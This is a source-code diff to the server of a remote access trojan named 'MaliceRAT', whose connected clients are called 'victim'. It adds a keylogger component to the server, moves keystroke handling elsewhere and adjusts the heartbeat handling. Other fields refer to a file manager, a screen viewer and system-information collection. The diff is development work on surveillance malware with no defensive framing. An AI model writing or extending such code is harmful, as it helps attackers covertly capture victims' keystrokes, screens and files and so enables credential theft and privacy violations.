@@ -19,6 +19,7 @@ namespace MaliceRAT.RatServer
         public Heartbeat heartbeatManager;
         public Features.SystemInformation systemInformation;
         public FileManager fileManager;
+        public KeyLogger keyLogger;
         #endregion
 
         #region Events
@@ -75,6 +76,7 @@ namespace MaliceRAT.RatServer
             fileManager = new FileManager(this);
             screenViewer = new ScreenViewer(this);
             heartbeatManager = new Heartbeat(HeartbeatInterval, this);
+            keyLogger = new KeyLogger(this);
             #endregion
         }
         #endregion
@@ -128,7 +130,6 @@ namespace MaliceRAT.RatServer
                         {
                             dynamic jsonMessage = serializer.Deserialize<dynamic>(completeMessage);
                             MessageReceived?.Invoke(victim, jsonMessage);
-                            ProcessJsonMessage(victim, jsonMessage);
                         }
                         catch (InvalidOperationException ex)
                         {
@@ -138,19 +139,8 @@ namespace MaliceRAT.RatServer
                     }
                 }
                 
-                heartbeatManager.StopHeartbeat();
+                heartbeatManager.StopHeartbeat(victim);
                 OnClientDisconnected(victim);
-            }
-        }
-
-        private void ProcessJsonMessage(Victim victim, dynamic jsonMessage)
-        {
-            switch (jsonMessage["type"].ToString())
-            {
-                case "keystroke":
-                    string keystroke = jsonMessage["key"].ToString();
-                    KeystrokeReceived?.Invoke(victim, keystroke);
-                    break;
             }
         }
 
